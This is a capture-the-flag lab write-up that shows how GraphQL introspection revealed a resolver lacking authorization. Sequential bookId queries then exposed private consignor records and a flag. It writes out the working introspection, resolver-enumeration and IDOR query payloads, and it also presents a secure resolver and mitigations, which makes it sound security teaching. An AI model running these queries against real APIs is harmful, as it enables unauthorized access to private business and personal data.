---
title: "GraphQL BOLA via Introspection & Insecure Resolver Access | Slate Quarry"
date: 2026-05-15 11:15:00 +0530
categories: [A01 - Broken Access Control, BOLA]
tags: [graphql, bola, idor, authorization, introspection, api-security, webversepro]
author: Shivansh Sharma
platform: WebVerse 
image:
  path: /assets/images/posts/slate-quarry.webp
  alt: Slate Quarry WebVerse Lab
---

# GraphQL BOLA via Introspection & Insecure Resolver Access | Slate Quarry

## Overview

Slate Quarry is a WebVerse Labs challenge focused on GraphQL security weaknesses, specifically:

- GraphQL schema introspection abuse
- Broken Object Level Authorization (BOLA)
- GraphQL IDOR
- Sensitive business data exposure

The application simulates a small antiquarian bookstore where public catalogue data is accessible online, while private consignment ledger information was intended to remain internal.

Through GraphQL introspection and authorization testing, hidden backend functionality became discoverable and fully accessible without authentication controls.

---

## Lab Link

- Lab: [Slate Quarry – WebVerse Labs](https://dashboard.webverselabs-pro.com/mystery-challenges/slate-quarry)

---

## Objective

Explore the GraphQL schema, identify insecure resolver functionality, enumerate private ledger records, and retrieve the flag.

---

## Initial Reconnaissance

While browsing the application, the public catalogue endpoint was identified:

```text
https://99fa5460-4065-slate-quarry-116db.events.webverselabs-pro.com/catalogue
```

The website displayed publicly visible books available in the shop inventory.

Opening an individual book page:

```text
https://99fa5460-4065-slate-quarry-116db.events.webverselabs-pro.com/book/1
```

Burp Suite history revealed an interesting backend request:

```http
POST /graphql HTTP/2
```

This confirmed the application relied on a GraphQL API.

---

## GraphQL Schema Exploration

The next step was testing whether GraphQL introspection was enabled.

### Introspection Query

```http
POST /graphql HTTP/2
Host: 99fa5460-4065-slate-quarry-116db.events.webverselabs-pro.com
Content-Type: application/json

{
  "query":"query IntrospectionQuery { __schema { types { name fields { name } } } }"
}
```

The response exposed multiple schema objects, including a highly sensitive type:

```graphql
type ConsignorReserve {
  bookId
  consignorName
  reservePrice
  acquisitionDate
  internalNotes
}
```

This immediately suggested the existence of an internal business ledger accessible through GraphQL.

---

## Enumerating Resolver Signatures

The first query attempt triggered GraphQL argument validation errors.

To enumerate exact resolver signatures, the following query was used:

```json
{
  "query":"{ __type(name:\"Query\") { fields { name args { name type { name kind ofType { name kind } } } } } }"
}
```

This revealed the precise query structure:

```graphql
consignorReserveById(bookId: ID!)
```

Now the exact resolver could be queried correctly.

---

## Exploiting the Vulnerable Resolver

### Working Query

```http
POST /graphql HTTP/2
Host: 99fa5460-4065-slate-quarry-116db.events.webverselabs-pro.com
Content-Type: application/json

{
  "query":"query { consignorReserveById(bookId:\"1\") { bookId consignorName reservePrice acquisitionDate internalNotes } }"
}
```

The response exposed private ledger information tied to the selected book.

This confirmed:

- No authorization checks existed
- Internal business records were publicly accessible
- Arbitrary object enumeration was possible

---

## Enumerating Additional Records

Additional records could then be accessed by modifying the `bookId`.

### Example

```json
{
  "query":"query { consignorReserveById(bookId:\"2\") { consignorName reservePrice internalNotes } }"
}
```

Sequential enumeration quickly exposed multiple private records.

---

## Retrieving the Flag

Further enumeration eventually revealed the flag at `bookId 7`.

### Payload

```json
{
  "query":"query { consignorReserveById(bookId:\"7\") { consignorName reservePrice internalNotes } }"
}
```

### Response

```text
WEBVERSE{REDACTED}
```

---

## Proof of Exploitation

### Introspection Enabled

```graphql
__schema
__type
```

### Sensitive Internal Resolver

```graphql
consignorReserveById(bookId: ID!)
```

### Unauthorized Data Access

```graphql
query {
  consignorReserveById(bookId:"7") {
    consignorName
    reservePrice
    internalNotes
  }
}
```

### Result

- Private consignor information disclosure
- Internal reserve pricing exposure
- Internal negotiation notes disclosure
- Unauthorized access to protected business records
- Flag retrieval

---

## Vulnerability Analysis

The core issue was not introspection itself.

Introspection only exposed the available attack surface.

The actual vulnerability was:

- Broken Object Level Authorization (BOLA)
- GraphQL IDOR
- Missing authorization middleware

The backend likely implemented logic similar to:

```javascript
consignorReserveById: (_, { bookId }) => {
  return db.reserveLedger.find(r => r.bookId === bookId)
}
```

instead of properly validating user permissions.

---

## Secure Implementation Example

A secure resolver should verify authentication and authorization before returning sensitive data.

```javascript
consignorReserveById: (_, { bookId }, user) => {

  if (!user || user.role !== "admin") {
    throw new Error("Unauthorized")
  }

  return db.reserveLedger.find(r => r.bookId === bookId)
}
```

---

## Why This Happens Frequently in GraphQL

GraphQL applications commonly suffer from this issue because developers assume:

- Hidden frontend functionality is sufficient
- Users will only execute intended queries
- Internal schema objects are safe if not linked in the UI

However, GraphQL introspection makes hidden functionality extremely easy to discover.

Attackers can enumerate:

- Types
- Queries
- Mutations
- Resolver arguments
- Internal object relationships

within minutes.

---

## Impact

Successful exploitation exposed:

- Internal business records
- Private consignor details
- Financial reserve pricing
- Internal negotiation notes
- Sensitive operational metadata

In real-world environments, this could lead to:

- Business intelligence leaks
- Privacy violations
- Financial exposure
- Competitor intelligence gathering
- Unauthorized access to restricted datasets

---

## Mitigation

### Disable Introspection in Production

Production environments should restrict or disable introspection for untrusted users.

---

### Enforce Authorization on Every Resolver

Authorization must be validated server-side for every sensitive object request.

Never rely on:

- Hidden routes
- Frontend controls
- Obscurity

---

### Implement Object-Level Authorization

Users should only access records they explicitly own or are authorized to view.

---

### Rate Limit Enumeration Attempts

GraphQL enumeration attacks become much harder when:

- Rate limits exist
- Query depth limits are enforced
- Query complexity restrictions are enabled

---

## Real-World Insight

GraphQL APIs often unintentionally expose internal application functionality because schema objects become self-documenting through introspection.

Developers frequently focus on frontend visibility instead of backend authorization.

This creates situations where attackers can:

1. Enumerate the schema
2. Discover hidden resolvers
3. Abuse object references
4. Extract sensitive data directly from backend logic

Modern bug bounty programs regularly uncover GraphQL BOLA vulnerabilities for exactly this reason.

---

## Key Takeaways

- GraphQL introspection dramatically increases attack surface visibility
- Hidden functionality is not secure functionality
- Every resolver requires explicit authorization checks
- BOLA remains one of the most common API vulnerabilities
- Sensitive business logic should never rely on obscurity